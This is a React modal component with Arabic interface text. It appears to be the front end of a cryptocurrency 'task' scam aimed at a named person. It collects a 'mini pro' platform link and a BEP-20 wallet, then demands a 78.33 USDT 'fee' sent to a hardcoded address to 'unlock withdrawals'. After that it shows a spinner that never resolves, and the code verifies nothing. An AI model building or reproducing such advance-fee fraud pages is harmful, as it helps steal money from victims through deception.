
import React, { useState } from 'react';

const TaskModal: React.FC = () => {
  const [step, setStep] = useState(1);
  const [isVisible, setIsVisible] = useState(true);

  if (!isVisible) return null;

  const handleNext = () => {
    setStep(step + 1);
  };

  const handleFinish = () => {
    setStep(4);
    // يمكن هنا إضافة مؤقت ليختفي المربع بعد مدة أو يظل ثابتاً كما طلبت
  };

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-6" dir="rtl">
      {/* Background Blur Overlay - Reduced blur from md to sm for a lighter feel */}
      <div className="absolute inset-0 bg-black/30 backdrop-blur-[3px]" />

      {/* Modal Card */}
      <div className="relative w-full max-w-[340px] bg-white rounded-[24px] shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
        <div className="p-6">
          {step === 1 && (
            <div className="space-y-4">
              <h2 className="text-xl font-bold text-[#333] text-center">تنبيه المهام</h2>
              <p className="text-[#666] leading-relaxed text-center">
                اهلا بك <span className="font-bold text-[#9B4A4E]">Waelalzaeyd</span> تم حل أمر المهام اضغط التالي وقم بوضع رابط المنصه mini pro لقسم الايداع حصرا
              </p>
              <div className="space-y-3">
                <input 
                  type="text" 
                  placeholder="رابط المنصة mini pro" 
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#9B4A4E] transition-all text-sm text-right"
                />
                <button 
                  onClick={handleNext}
                  className="w-full py-3.5 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold rounded-xl shadow-lg active:scale-95 transition-transform"
                >
                  التالي
                </button>
              </div>
            </div>
          )}

          {step === 2 && (
            <div className="space-y-4">
              <h2 className="text-xl font-bold text-[#333] text-center">رابط المحفظة</h2>
              <p className="text-[#666] leading-relaxed text-center">
                يرجى وضع رابط محفظة <span className="font-bold">BEP 20</span> الخاصة بك للمتابعة
              </p>
              <div className="space-y-3">
                <input 
                  type="text" 
                  placeholder="رابط محفظة BEP 20" 
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#9B4A4E] transition-all text-sm text-right"
                />
                <button 
                  onClick={handleNext}
                  className="w-full py-3.5 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold rounded-xl shadow-lg active:scale-95 transition-transform"
                >
                  التالي
                </button>
              </div>
            </div>
          )}

          {step === 3 && (
            <div className="space-y-4 text-right">
              <h2 className="text-xl font-bold text-[#333] text-center">تفعيل قناة السحب</h2>
              <div className="bg-amber-50 border-r-4 border-amber-400 p-3 mb-2">
                <p className="text-[#444] text-[13px] leading-relaxed">
                  اهلا بك <span className="font-bold text-[#9B4A4E]">Waelalzaeyd</span> بقي أمر إيداع مبلغ <span className="font-bold text-red-600">78.33</span> عملة <span className="font-bold">USDT BEP 20</span> لفتح قناة السحب.
                </p>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed bg-gray-50 p-2 rounded-lg italic">
                هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro
              </p>
              <div className="p-3 bg-gray-100 rounded-lg break-all">
                <p className="text-[10px] text-gray-400 mb-1 text-center">عنوان الإيداع (BEP20)</p>
                <p className="text-[12px] font-mono font-bold text-center text-[#333]">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
              </div>
              <button 
                onClick={handleFinish}
                className="w-full py-3.5 bg-gradient-to-r from-[#9B4A4E] to-[#7C4A50] text-white font-bold rounded-xl shadow-lg active:scale-95 transition-transform"
              >
                تم الايداع
              </button>
            </div>
          )}

          {step === 4 && (
            <div className="py-8 space-y-6 flex flex-col items-center">
              <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
              <p className="text-lg font-bold text-[#333] text-center px-4">
                الرجاء الانتظار للتأكد من عمليه الايداع
              </p>
              <p className="text-sm text-gray-400 text-center">قد تستغرق هذه العملية عدة دقائق...</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default TaskModal;
